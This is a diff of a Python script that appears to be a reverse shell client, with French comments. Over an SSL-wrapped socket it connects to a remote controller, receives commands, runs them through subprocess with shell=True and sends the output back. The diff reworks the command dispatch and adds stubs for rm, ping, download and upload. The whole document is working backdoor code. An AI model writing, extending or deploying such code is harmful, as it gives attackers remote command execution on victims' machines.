@@ -33,7 +33,7 @@ wrappedSocket = context.wrap_socket(sock, server_hostname=HOST)
 wrappedSocket.connect((HOST, PORT))
 
 try:
-   while True:
+   while wrappedSocket:
         received_data = wrappedSocket.recv(1024)
         # Send the output of the command over the SSL connection
         # Execute a system command
@@ -42,40 +42,40 @@ try:
         print(cmd)
         #received_data = 0
         # la commande a-t-elle des paramètres ?
-        if len(cmd) >= 2:
-            if cmd[0] == "cd" or cmd[0] == "CD":
-                os.chdir(cmd[1])
-                # à supprimer (debug)
-                output = "Changed directory to {}".format(os.getcwd())
-                send(output)
-            elif cmd[0] == "cp" or cmd[0] == "CP":
-                print(cmd)
-            elif cmd[0] == "q" or cmd[0] == "quit" or cmd[0] == "exit":
-                wrappedSocket.shutdown(socket.SHUT_RDWR)
-                wrappedSocket.close()
-                exit(0)
-            else:
-                command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
-                                       stderr=subprocess.PIPE)
-                output, err = command.communicate(timeout=60)
-                if not err:
-                    send(output)
-                elif not output:
-                    send(err)
-                else:
-                    send("[-] Error: couldn't send data")
+        if cmd[0] == "cd" or cmd[0] == "CD":
+            os.chdir(cmd[1])
+            # à supprimer (debug)
+            output = "Changed directory to {}".format(os.getcwd())
+            send(output)
+        elif cmd[0] == "cp" or cmd[0] == "CP":
+            send(cmd)
+        elif cmd[0] == "rm" or cmd[0] == "RM":
+            send(cmd)
+        elif cmd[0] == "ping":
+            send(cmd)
+        elif cmd[0] == "download":
+            send(cmd)
+        elif cmd[0] == "upload":
+            send(cmd)
+        elif cmd[0] == "q" or cmd[0] == "quit" or cmd[0] == "exit":
+            wrappedSocket.shutdown(socket.SHUT_RDWR)
+            wrappedSocket.close()
+            exit(0)
+        if cmd[0] == "pwd":
+            output = os.getcwd()
+            send(output)
+        if cmd[0] == "help":
+            print(cmd)
         else:
-            if cmd[0] == "pwd":
-                output = os.getcwd()
+            command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
+                                    stderr=subprocess.PIPE)
+            output, err = command.communicate(timeout=60)
+            if not err:
                 send(output)
-            else :
-                command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
-                                        stderr=subprocess.PIPE)
-                output, err = command.communicate()
-                if not err:
-                    send(output)
-                else:
-                    send(err)
+            elif not output:
+                send(err)
+            else:
+                send("[-] Error: couldn't send data")
 except Exception:
     exit(-1)
 finally:
